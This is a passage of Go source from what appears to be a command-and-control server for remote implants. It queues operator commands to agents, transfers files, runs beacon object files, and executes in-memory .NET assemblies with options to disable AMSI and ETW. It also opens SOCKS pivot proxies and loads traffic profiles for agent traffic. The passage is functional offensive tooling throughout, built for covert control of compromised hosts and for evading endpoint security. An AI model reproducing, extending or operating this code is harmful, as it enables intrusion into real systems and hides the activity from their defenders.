
	log.Printf("[QueueDownloadCommand] Created command: %+v", cmd)

	s.CommandBuffer[clientID] = append(s.CommandBuffer[clientID], cmd)

	log.Printf("[QueueDownloadCommand] Buffer state after append: %+v", s.CommandBuffer[clientID])

	return nil
}

func parseSocksCommand(cmdStr string) (map[string]interface{}, error) {
	parts := strings.Fields(cmdStr)
	if len(parts) < 3 {
		return nil, fmt.Errorf("invalid SOCKS command format")
	}

	// Handle stop command
	if parts[1] == "stop" {
		socksPort, err := strconv.Atoi(parts[2])
		if err != nil {
			return nil, fmt.Errorf("invalid SOCKS port: %v", err)
		}
		return map[string]interface{}{
			"action":     "stop",
			"socks_port": socksPort,
		}, nil
	}

	// Handle start command
	if len(parts) < 5 {
		return nil, fmt.Errorf("invalid SOCKS start command format")
	}

	socksPort, err := strconv.Atoi(parts[2])
	if err != nil {
		return nil, fmt.Errorf("invalid SOCKS port: %v", err)
	}

	// Parse the URL properly
	urlStr := parts[3]
	// Remove the protocol prefix if present
	urlStr = strings.TrimPrefix(urlStr, "https://")
	urlStr = strings.TrimPrefix(urlStr, "http://")

	// Split host and path
	var host, path string
	if idx := strings.Index(urlStr, "/"); idx != -1 {
		host = urlStr[:idx]
		path = urlStr[idx:] // Keep the leading slash
	} else {
		host = urlStr
		path = "/"
	}

	wssPort, err := strconv.Atoi(parts[4])
	if err != nil {
		return nil, fmt.Errorf("invalid WSS port: %v", err)
	}

	return map[string]interface{}{
		"action":     parts[1],
		"socks_port": socksPort,
		"wss_port":   wssPort,
		"wss_host":   host,
		"path":       path,
	}, nil
}

// startSocksServer initializes and starts a server-side SOCKS proxy
func (s *GRPCServer) startSocksServer(socksData map[string]interface{}) error {
	socksPort, ok := socksData["socks_port"].(int)
	if !ok {
		return fmt.Errorf("invalid socks_port in configuration")
	}

	path, ok := socksData["path"].(string)
	if !ok {
		return fmt.Errorf("invalid path in configuration")
	}

	serverKey := fmt.Sprintf("%d", socksPort)

	s.socksMutex.Lock()
	defer s.socksMutex.Unlock()

	// Check if server already exists
	if _, exists := s.socksServers[serverKey]; exists {
		return fmt.Errorf("SOCKS server already running on port %d", socksPort)
	}

	// Create credentials (for now, we'll use empty credentials as they're handled on the agent side)
	// The server-side proxy just needs to accept WebSocket connections from agents
	creds := &socks.Credentials{
		Username: "",
		Password: "",
		SSHKey:   []byte{},
	}

	// Create the SOCKS server
	server, err := socks.NewServer(socksPort, path, creds)
	if err != nil {
		return fmt.Errorf("failed to create SOCKS server: %w", err)
	}

	// Start the server
	if err := server.Start(); err != nil {
		return fmt.Errorf("failed to start SOCKS server: %w", err)
	}

	// Register the WebSocket handler with the HTTP server
	if s.manager != nil {
		s.manager.RegisterSocksRoute(path, server.GetHandler())
		log.Printf("[SOCKS] Registered WebSocket handler for path: %s", path)
	} else {
		server.Stop()
		return fmt.Errorf("no manager available to register WebSocket handler")
	}

	// Set up automatic cleanup when agent connection dies
	server.SetConnectionLostCallback(func() {
		log.Printf("[SOCKS] Agent connection lost for port %d, cleaning up server-side proxy", socksPort)

		// Create socksData for cleanup
		cleanupData := map[string]interface{}{
			"socks_port": socksPort,
			"path":       path,
		}

		// Stop the server (this will also clean up from the map)
		if err := s.stopSocksServer(cleanupData); err != nil {
			log.Printf("[SOCKS] Error during automatic cleanup: %v", err)
		} else {
			log.Printf("[SOCKS] Automatic cleanup completed for port %d", socksPort)
		}
	})

	// Store the server
	s.socksServers[serverKey] = &struct {
		server *socks.Server
		bridge *socks.Bridge
	}{
		server: server,
		bridge: nil, // Bridge is handled on agent side
	}

	log.Printf("[SOCKS] Started SOCKS server on port %d (WebSocket path: %s)", socksPort, path)
	return nil
}

// stopSocksServer stops a running SOCKS proxy server
func (s *GRPCServer) stopSocksServer(socksData map[string]interface{}) error {
	socksPort, ok := socksData["socks_port"].(int)
	if !ok {
		return fmt.Errorf("invalid socks_port in configuration")
	}

	serverKey := fmt.Sprintf("%d", socksPort)

	s.socksMutex.Lock()
	defer s.socksMutex.Unlock()

	// Check if server exists
	serverInfo, exists := s.socksServers[serverKey]
	if !exists {
		return fmt.Errorf("no SOCKS server running on port %d", socksPort)
	}

	// Get the path for unregistering
	path, _ := socksData["path"].(string)

	// Unregister the WebSocket handler
	if path != "" && s.manager != nil {
		s.manager.RemoveSocksRoute(path)
		log.Printf("[SOCKS] Unregistered WebSocket handler for path: %s", path)
	}

	// Stop the server
	if err := serverInfo.server.Stop(); err != nil {
		log.Printf("[SOCKS] Error stopping SOCKS server on port %d: %v", socksPort, err)
		// Continue with cleanup even if stop fails
	}

	// Remove from map
	delete(s.socksServers, serverKey)

	log.Printf("[SOCKS] Stopped SOCKS server on port %d", socksPort)
	return nil
}

func (s *GRPCServer) processReceivedMessage(msg *pb.StreamMessage) {
	switch msg.Type {
	case "agent_command":
		var commandData struct {
			Command      string `json:"command"`
			AgentID      string `json:"agent_id"`
			CommandID    string `json:"command_id"`
			Filename     string `json:"filename"`
			RemotePath   string `json:"remote_path"`
			Username     string `json:"username"`
			Timestamp    string `json:"timestamp"`
			Data         string `json:"data"`
			CurrentChunk int    `json:"currentChunk"`
			TotalChunks  int    `json:"totalChunks"`
			DBID         int    `json:"db_id,omitempty"` // If provided, command already stored by caller
			// BOF-specific fields
			Arch      string `json:"arch,omitempty"`
			FileSize  int    `json:"file_size,omitempty"`
			FileHash  string `json:"file_hash,omitempty"`
			Arguments string `json:"arguments,omitempty"`
			BOFName   string `json:"bof_name,omitempty"`
			JobID     string `json:"job_id,omitempty"`
			// Inline-assembly specific fields
			AssemblyB64  string   `json:"assembly_b64,omitempty"`
			ArgumentList []string `json:"arguments_list,omitempty"`
			AppDomain    string   `json:"app_domain,omitempty"`
			DisableAMSI  bool     `json:"disable_amsi,omitempty"`
			DisableETW   bool     `json:"disable_etw,omitempty"`
			RevertETW    bool     `json:"revert_etw,omitempty"`
			EntryPoint   string   `json:"entry_point,omitempty"`
		}
		if err := json.Unmarshal([]byte(msg.Content), &commandData); err != nil {
			log.Printf("[ProcessMessage] Failed to unmarshal agent_command: %v", err)
			return
		}

		log.Printf("[ProcessMessage] Received command: %s for agent %s",
			commandData.Command, commandData.AgentID)

		// MODIFICATION: Strip local path from upload command before sending to agent
		processedCommand := commandData.Command
		if strings.HasPrefix(commandData.Command, "upload ") {
			// Parse the upload command to extract only the remote path
			parts := strings.Fields(commandData.Command)
			if len(parts) >= 2 {
				// parts[0] = "upload"
				// parts[1] = local path (which we want to remove)
				// parts[2] = remote path (if provided)

				if len(parts) == 2 {
					// Only local path provided, use just "upload" with filename from RemotePath
					processedCommand = "upload " + commandData.RemotePath
				} else if len(parts) >= 3 {
					// Both local and remote paths provided
					// Keep only "upload" + remote path
					remoteParts := parts[2:]
					processedCommand = "upload " + strings.Join(remoteParts, " ")
				}

				log.Printf("[ProcessMessage] Processed upload command: '%s' -> '%s'",
					commandData.Command, processedCommand)
			}
		}

		// Store command in database (unless already stored by caller who provided db_id)
		var commandDBID int
		if commandData.DBID > 0 {
			// Command already stored by caller (e.g., direct REST handler)
			commandDBID = commandData.DBID
			log.Printf("[ProcessMessage] Using existing db_id=%d from caller", commandDBID)
		} else {
			// Store command in database
			err := s.db.QueryRow(`
                INSERT INTO commands (username, guid, command, timestamp)
                VALUES ($1, $2, $3, $4)
                RETURNING id`,
				commandData.Username,
				commandData.AgentID,
				commandData.Command, // Store original for audit
				commandData.Timestamp,
			).Scan(&commandDBID)

			if err != nil {
				log.Printf("[ProcessMessage] Failed to store command in database: %v", err)
				// ADD: Log the error
				if s.commandLogger != nil {
					s.commandLogger.LogError(commandData.AgentID, commandData.Command, err)
				}
				return
			}
		}

		// ADD: Log the incoming command
		if s.commandLogger != nil {
			s.commandLogger.LogCommand(
				commandData.AgentID,
				commandData.Username,
				commandData.Command,
				commandDBID, // Use the database ID as command ID
			)
		}

		// Create command with processed (stripped) command for the agent
		// Translate command name to numeric ID for payload dispatch
		cmdType := commands.GetCommandID(processedCommand)
		cmd := Command{
			CommandType:  cmdType,           // Numeric ID for payload dispatch
			Command:      processedCommand,  // Use the processed command without local path
			CommandID:    commandData.CommandID,
			CommandDBID:  commandDBID,
			AgentID:      commandData.AgentID,
			Filename:     commandData.Filename,
			RemotePath:   commandData.RemotePath,
			CurrentChunk: commandData.CurrentChunk,
			TotalChunks:  commandData.TotalChunks,
			Data:         commandData.Data,
			Timestamp:    commandData.Timestamp,
		}

		// Log what type of command we're processing with truncated data
		if strings.HasPrefix(processedCommand, "inline-assembly") {
			log.Printf("[ProcessMessage] Processing inline-assembly command with %d bytes of JSON data", len(cmd.Data))

			// Check if data already contains the assembly data from websocket
			if cmd.Data == "" {
				// Only build if Data is empty (for backward compatibility)
				log.Printf("[ProcessMessage] Building inline-assembly data from individual fields")
				inlineAssemblyData := map[string]interface{}{
					"assembly_b64": commandData.AssemblyB64,
					"arguments":    commandData.ArgumentList,
					"app_domain":   commandData.AppDomain,
					"disable_amsi": commandData.DisableAMSI,
					"disable_etw":  commandData.DisableETW,
					"revert_etw":   commandData.RevertETW,
					"entry_point":  commandData.EntryPoint,
					"async":        strings.Contains(commandData.Command, "async"),
				}

				if inlineAssemblyJSON, err := json.Marshal(inlineAssemblyData); err == nil {
					cmd.Data = string(inlineAssemblyJSON)
				}
			} else {
				log.Printf("[ProcessMessage] Using existing inline-assembly data from websocket (%d bytes)", len(cmd.Data))
				// Don't overwrite cmd.Data - it already has the correct JSON!
			}
		} else if strings.HasPrefix(processedCommand, "bof") {
			log.Printf("[ProcessMessage] Processing BOF command: %s (chunk %d/%d) with %d bytes of data",
				processedCommand, cmd.CurrentChunk, cmd.TotalChunks, len(cmd.Data))

			// Handle BOF-specific data
			if commandData.CurrentChunk == 0 && commandData.TotalChunks > 1 {
				// Initialize chunked BOF
				log.Printf("[ProcessMessage] Starting chunked BOF upload: %s", commandData.BOFName)
			}
		} else if processedCommand == "upload" && cmd.Data != "" {
			log.Printf("[ProcessMessage] Processing upload command: chunk %d/%d for %s (%d bytes of data)",
				cmd.CurrentChunk, cmd.TotalChunks, cmd.Filename, len(cmd.Data))
		} else {
			log.Printf("[ProcessMessage] Processing command: %s", processedCommand)
		}

		// Handle clear command
		if commandData.Command == "clear" {
			s.Mutex.Lock()
			if commands, exists := s.CommandBuffer[commandData.AgentID]; exists {
				// Keep only upload and download commands
				filteredCommands := make([]Command, 0)
				for _, cmd := range commands {
					if strings.HasPrefix(cmd.Command, "upload") || strings.HasPrefix(cmd.Command, "download") {
						filteredCommands = append(filteredCommands, cmd)
					}
				}
				s.CommandBuffer[commandData.AgentID] = filteredCommands
				log.Printf("[ProcessMessage] Cleared command buffer for agent %s (keeping %d file transfer commands)",
					commandData.AgentID, len(filteredCommands))

				// Send result back without adding clear to command buffer
				commandResult := map[string]interface{}{
					"agent_id":   commandData.AgentID,
					"command_id": commandData.CommandID,
					"output":     fmt.Sprintf("Cleared command buffer (keeping %d file transfer commands)", len(filteredCommands)),
					"timestamp":  time.Now().Format(time.RFC3339),
					"status":     "completed",
				}
				s.Mutex.Unlock()

				if err := s.BroadcastResult(commandResult); err != nil {
					log.Printf("[ProcessMessage] Failed to broadcast clear command result: %v", err)
				}
				return
			}
			s.Mutex.Unlock()
			return
		}

		// Handle jobs command
		if commandData.Command == "jobs" {
			const ChunkSize = 512 * 1024 // 512KB chunks
			s.Mutex.Lock()
			activeJobs := []FileTransferJob{}
			jobID := 1

			if commands, exists := s.CommandBuffer[commandData.AgentID]; exists {
				for _, cmd := range commands {
					if strings.HasPrefix(cmd.Command, "upload") || strings.HasPrefix(cmd.Command, "download") {
						job := FileTransferJob{
							JobID:    jobID,
							Type:     strings.Split(cmd.Command, " ")[0],
							Filename: cmd.Filename,
							Progress: int((float64(cmd.CurrentChunk) / float64(cmd.TotalChunks)) * 100),
						}

						// Calculate sizes
						if cmd.TotalChunks > 0 {
							job.TotalSize = int64(cmd.TotalChunks * ChunkSize)
							job.CurrentSize = int64(cmd.CurrentChunk * ChunkSize)
						}

						activeJobs = append(activeJobs, job)
						jobID++
					}
				}
			}
			s.Mutex.Unlock()

			// Create job list output
			var output string
			if len(activeJobs) == 0 {
				output = "No active file transfer jobs"
			} else {
				output = fmt.Sprintf("Active file transfer jobs:\n")
				for _, job := range activeJobs {
					output += fmt.Sprintf("[%d] %s: %s (%d%% - %d/%d bytes)\n",
						job.JobID, job.Type, job.Filename, job.Progress, job.CurrentSize, job.TotalSize)
				}
			}

			// Send result immediately
			commandResult := map[string]interface{}{
				"agent_id":   commandData.AgentID,
				"command_id": commandData.CommandID,
				"output":     output,
				"timestamp":  time.Now().Format(time.RFC3339),
				"status":     "completed",
			}

			if err := s.BroadcastResult(commandResult); err != nil {
				log.Printf("[ProcessMessage] Failed to broadcast jobs result: %v", err)
			}
			return
		}

		// Handle SOCKS command
		if strings.HasPrefix(commandData.Command, "socks") {
			log.Printf("[ProcessMessage] Processing SOCKS command: %s", commandData.Command)
			socksData, err := parseSocksCommand(commandData.Command)
			if err != nil {
				log.Printf("[ProcessMessage] Failed to parse SOCKS command: %v", err)
				return
			}

			// Start server-side SOCKS proxy if action is "start"
			if socksData["action"] == "start" {
				if err := s.startSocksServer(socksData); err != nil {
					log.Printf("[ProcessMessage] Failed to start SOCKS server: %v", err)
					// Send error back to client
					errorMsg := map[string]interface{}{
						"type":      "socks_error",
						"command_id": commandData.CommandID,
						"agent_id":  commandData.AgentID,
						"error":     fmt.Sprintf("Failed to start SOCKS server: %v", err),
						"timestamp": time.Now().Format(time.RFC3339),
					}
					s.BroadcastResult(errorMsg)
					return
				}
			} else if socksData["action"] == "stop" {
				s.stopSocksServer(socksData)
			}

			// Convert to JSON for the Data field
			socksJSON, err := json.Marshal(socksData)
			if err != nil {
				log.Printf("[ProcessMessage] Failed to marshal SOCKS data: %v", err)
				return
			}
			cmd.Data = string(socksJSON)

			log.Printf("[ProcessMessage] SOCKS command data prepared: %d bytes", len(cmd.Data))
		}

		// Add command to buffer
		s.Mutex.Lock()
		if s.CommandBuffer[commandData.AgentID] == nil {
			s.CommandBuffer[commandData.AgentID] = make([]Command, 0)
		}
		s.CommandBuffer[commandData.AgentID] = append(s.CommandBuffer[commandData.AgentID], cmd)

		// Log buffer status without showing data
		bufferSize := len(s.CommandBuffer[commandData.AgentID])
		s.Mutex.Unlock()

		log.Printf("[ProcessMessage] Command queued for agent %s (buffer size: %d, command: %s)",
			commandData.AgentID, bufferSize, commandData.Command)

		// Send acknowledgment with DB ID for REST API to use
		ackMsg := map[string]interface{}{
			"type":       "command_ack",
			"command_id": commandData.CommandID,
			"agent_id":   commandData.AgentID,
			"db_id":      commandDBID, // Include DB ID for REST API
			"status":     "queued",
			"timestamp":  time.Now().Format(time.RFC3339),
		}

		if err := s.BroadcastResult(ackMsg); err != nil {
			log.Printf("[ProcessMessage] Failed to broadcast command acknowledgment: %v", err)
		}

	case "notification":
		log.Printf("[ProcessMessage] Received notification: %s", msg.Content)

	case "status_update":
		log.Printf("[ProcessMessage] Received status update: %s", msg.Content)

	case "sync_profiles":
		log.Printf("[ProcessMessage] Received profile sync from websocket service")
		s.handleProfileSync(msg)

	default:
		log.Printf("[ProcessMessage] Unknown message type: %s", msg.Type)
	}
}

// handleProfileSync processes profile updates from the websocket service
// This allows dynamically uploaded profiles to be available for routing agent requests
func (s *GRPCServer) handleProfileSync(msg *pb.StreamMessage) {
	var profileData struct {
		GetProfiles            []config.GetProfile            `json:"get_profiles"`
		PostProfiles           []config.PostProfile           `json:"post_profiles"`
		ServerResponseProfiles []config.ServerResponseProfile `json:"server_response_profiles"`
	}

	if err := json.Unmarshal([]byte(msg.Content), &profileData); err != nil {
		log.Printf("[ProfileSync] Failed to unmarshal profile data: %v", err)
		return
	}

	// Update the listener manager's profiles
	if s.manager != nil {
		s.manager.UpdateProfiles(
			profileData.GetProfiles,
			profileData.PostProfiles,
			profileData.ServerResponseProfiles,
		)
		log.Printf("[ProfileSync] Updated profiles: %d GET, %d POST, %d Response",
			len(profileData.GetProfiles),
			len(profileData.PostProfiles),
			len(profileData.ServerResponseProfiles))
	} else {
		log.Printf("[ProfileSync] Warning: Manager is nil, cannot update profiles")
	}
}

func (s *GRPCServer) RemoveAgent(ctx context.Context, req *pb.RemoveAgentRequest) (*pb.RemoveAgentResponse, error) {
	tx, err := s.db.BeginTx(ctx, nil)
	if err != nil {
		return nil, err
	}
	defer tx.Rollback()

	query := `UPDATE connections SET deleted_at = CURRENT_TIMESTAMP WHERE newclientid = $1`
	if _, err := tx.ExecContext(ctx, query, req.AgentId); err != nil {
		return nil, fmt.Errorf("failed to update connection: %v", err)
	}

	if err := tx.Commit(); err != nil {
		return nil, err
	}

	return &pb.RemoveAgentResponse{
		Success: true,
		Message: fmt.Sprintf("Agent %s removed successfully", req.AgentId),
	}, nil
}
